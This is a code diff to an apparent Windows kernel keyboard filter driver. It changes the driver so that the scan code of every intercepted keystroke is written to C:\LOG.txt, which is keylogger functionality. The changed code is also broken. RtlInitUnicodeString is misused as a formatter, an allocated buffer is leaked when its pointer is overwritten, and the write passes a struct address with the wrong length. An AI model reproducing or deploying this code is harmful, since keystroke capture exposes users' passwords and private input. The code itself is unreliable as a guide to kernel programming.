@@ -100,7 +100,7 @@ AddDevice(
 
 
 	NTSTATUS fi;
-	RtlInitUnicodeString(&TestName, L"\\??\\C:\\LOG.file");
+	RtlInitUnicodeString(&TestName, L"\\??\\C:\\LOG.txt");
 	InitializeObjectAttributes(&ObjAttr, &TestName,
 		OBJ_CASE_INSENSITIVE,
 		0, NULL);
@@ -134,6 +134,9 @@ NTSTATUS ReadCompletion(
 	ULONG KeyCount;
 	ULONG i;
 	UNICODE_STRING buf;
+	LARGE_INTEGER liOffset = { 0 };
+	PVOID lpBuffer;
+	NTSTATUS er;
 	if (Irp->IoStatus.Status == STATUS_SUCCESS)
 	{
 		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
@@ -141,13 +144,17 @@ NTSTATUS ReadCompletion(
 
 		for (i = 0; i < KeyCount; i++)
 		{
-			RtlInitUnicodeString(&buf, L"S");
-			ZwWriteFile(TestFile,
+			RtlInitUnicodeString(&buf, L"%d", KeyData[i].MakeCode);
+			/*ZwQueryInformationFile(TestFile, &IoStatus, &FileInfo,
+				sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);*/
+			lpBuffer = ExAllocatePool(NonPagedPool, sizeof(KeyData[i].MakeCode));
+			lpBuffer = &buf;
+			er = ZwWriteFile(TestFile,
 				NULL, NULL, NULL,
 				&IoStatus,
-				&buf.Buffer,
-				buf.Length,
-				NULL, NULL);
+				lpBuffer,
+				sizeof(KeyData[i].MakeCode),
+				&liOffset, NULL);
 		}
 	}
 
